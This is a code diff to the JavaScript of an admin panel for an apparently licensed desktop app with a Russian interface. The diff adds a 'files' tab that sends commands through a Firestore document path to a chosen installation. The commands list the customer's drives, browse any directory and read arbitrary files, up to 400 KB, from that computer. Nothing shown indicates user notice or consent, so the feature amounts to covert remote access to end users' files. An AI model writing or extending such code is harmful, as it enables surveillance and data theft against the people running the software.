@@ -7,6 +7,7 @@
   let secret = localStorage.getItem('okna_admin_key') || cfg.secret || '';
   let devices = [];
   let licenses = [];
+  let filesParent = '';
 
   function valueOf(v) {
     if (!v) return null;
@@ -129,6 +130,7 @@
   }
 
   function showDevice(device) {
+    window.__lastDevice = device;
     $('device-detail').classList.remove('hidden');
     $('detail-title').textContent = device.installId || 'Устройство';
     const info = device.device || {};
@@ -152,6 +154,7 @@
       <pre>${escapeHtml(pretty(device.selectedParams))}</pre>
       <h3>Заказ</h3>
       <pre>${escapeHtml(pretty(device.order))}</pre>
+      <p><button onclick="window.openFilesFor(window.__lastDevice)">Открыть файлы на компьютере</button></p>
       <h3>Файлы рядом с приложением</h3>
       <div class="table-wrap"><table><thead><tr><th>Файл</th><th>Размер</th><th>Изменён</th></tr></thead><tbody>${filesHtml}</tbody></table></div>`;
   }
@@ -218,6 +221,91 @@
     }
   }
 
+
+
+  async function sendCommand(type, path) {
+    const install = $('files-install').value.trim();
+    if (!install) {
+      $('files-status').textContent = 'Укажите installId (он есть в списке устройств)';
+      return null;
+    }
+    const id = `cmd-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
+    try {
+      await patchDoc(`installations/${install}/commands/${id}`, {
+        adminKey: s(secret),
+        type: s(type),
+        path: s(path || ''),
+        status: s('pending'),
+        createdAt: { timestampValue: new Date().toISOString() },
+      });
+      for (let attempt = 0; attempt < 20; attempt++) {
+        await new Promise((resolve) => setTimeout(resolve, 700));
+        const data = await getDoc(`installations/${install}/commands/${id}`);
+        if (data && (data.status === 'done' || data.status === 'error')) return data;
+      }
+      $('files-status').textContent = 'Клиент не ответил: приложение закрыто или нет сети';
+      return null;
+    } catch (error) {
+      $('files-status').textContent = `Ошибка: ${error.message}`;
+      return null;
+    }
+  }
+
+  async function openPath(path) {
+    $('files-status').textContent = 'Запрос…';
+    const data = await sendCommand('list', path);
+    if (!data) return;
+    const result = data.result || {};
+    $('files-status').textContent = result.error || result.path || '';
+    if (result.path) {
+      $('files-path').value = result.path;
+      filesParent = result.parent || '';
+    }
+    const body = $('files-body');
+    body.innerHTML = '';
+    for (const entry of result.entries || []) {
+      const tr = document.createElement('tr');
+      tr.innerHTML = `<td>${escapeHtml(entry.name)}</td><td>${entry.dir ? 'папка' : 'файл'}</td><td>${entry.dir ? '' : `${(entry.size / 1024).toFixed(1)} КБ`}</td><td>${fmtDate(entry.modified)}</td>`;
+      tr.addEventListener('click', () => {
+        if (entry.dir) openPath(entry.path);
+        else readPath(entry.path);
+      });
+      body.appendChild(tr);
+    }
+  }
+
+  async function readPath(path) {
+    $('files-status').textContent = 'Чтение файла…';
+    const data = await sendCommand('read', path);
+    if (!data) return;
+    const result = data.result || {};
+    $('file-title').textContent = result.path || path;
+    $('file-content').classList.remove('hidden');
+    $('file-content').textContent = result.error
+      ? result.error
+      : (result.binary ? `[двоичный файл, первые байты]\n${result.content}` : result.content);
+    $('files-status').textContent = result.size
+      ? `${(result.size / 1024).toFixed(1)} КБ${result.truncated ? ' · показаны первые 400 КБ' : ''}`
+      : '';
+  }
+
+  async function showRoots() {
+    $('files-status').textContent = 'Запрос дисков…';
+    const data = await sendCommand('roots', '');
+    if (!data) return;
+    const roots = data.result?.roots || [];
+    $('files-status').textContent = `Диски: ${roots.join(' ')}`;
+    if (roots.length === 1) openPath(roots[0]);
+  }
+
+  function openFilesFor(device) {
+    $('files-install').value = device.installId || device.id || '';
+    const appDir = device.device?.appDir || '';
+    $('files-path').value = appDir;
+    switchTab('files');
+    openPath(appDir);
+  }
+  window.openFilesFor = openFilesFor;
 
   function generateKey() {
     const alphabet = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
@@ -356,7 +444,7 @@
     for (const tab of document.querySelectorAll('.tabs button')) {
       tab.classList.toggle('active', tab.dataset.tab === name);
     }
-    for (const id of ['devices', 'events', 'keys', 'release']) {
+    for (const id of ['devices', 'events', 'files', 'keys', 'release']) {
       $(id).classList.toggle('hidden', id !== name);
     }
     if (name === 'release') loadRelease();
@@ -371,6 +459,11 @@
     $('load-events').addEventListener('click', loadEvents);
     $('save-release').addEventListener('click', saveRelease);
     $('create-key').addEventListener('click', createKey);
+    $('files-list').addEventListener('click', () => openPath($('files-path').value.trim()));
+    $('files-roots').addEventListener('click', showRoots);
+    $('files-up').addEventListener('click', () => {
+      if (filesParent) openPath(filesParent);
+    });
     $('close-key-detail').addEventListener('click', () => $('key-detail').classList.add('hidden'));
     for (const tab of document.querySelectorAll('.tabs button')) {
       tab.addEventListener('click', () => switchTab(tab.dataset.tab));
